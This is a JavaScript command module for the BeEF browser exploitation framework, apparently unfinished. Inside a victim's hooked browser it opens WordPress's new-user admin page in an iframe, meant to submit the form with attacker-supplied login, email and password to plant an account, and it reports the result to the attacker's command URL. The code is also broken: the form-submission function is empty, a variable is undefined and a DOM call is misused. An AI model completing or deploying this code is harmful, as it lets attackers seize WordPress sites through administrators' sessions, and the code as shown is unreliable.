/* jshint asi: true */
/* jshint laxcomma: true */

beef.execute(function () {
    'use strict';

    var UserCreator = function (opt) {
        this.opt = opt
    }

    UserCreator.prototype.create = function (callback) {
        this.openIFrame(function (err, iframe) {
            if (err) {
                callback(err)
                return
            }
            this.submitForm(form, function (err) {
                if (err) {
                    callback(err)
                    return
                }
                callback(null)
            })
        })
    }

    //////////////////////////////////////////////////////////////////////////

    UserCreator.prototype.openIFrame = function (callback) {
        var div = document.createElement("div")
        // div.style.display = "none"
        div.innerHTML = '<iframe src="/wp-admin/user-new.php"></iframe>'
        document.body.appendChild(div)

        var interval = setInterval(function () {
            var form = div.getElementsByTagName[0].contentWindow.document.getElementById('createuser')
            if (form) {
                clearInterval(interval)
                callback(null, form)
            }
        }, 100)
    }

    UserCreator.prototype.submitForm = function (callback) {
    }

    //////////////////////////////////////////////////////////////////////////

    var u = new UserCreator({
        user_login: '<%== @user_login %>',
        user_email: '<%== @user_email %>',
        user_pass: '<%== @user_pass %>',
    })

    u.create(function (err) {
        if (err) {
            beef.net.send('<%== @command_url %>', parseInt('<%== @command_id %>', 10), 'failed at creating user: '+JSON.stringify(err))
        } else {
            beef.net.send('<%== @command_url %>', parseInt('<%== @command_id %>', 10), 'successfully created user')
        }
    })
})
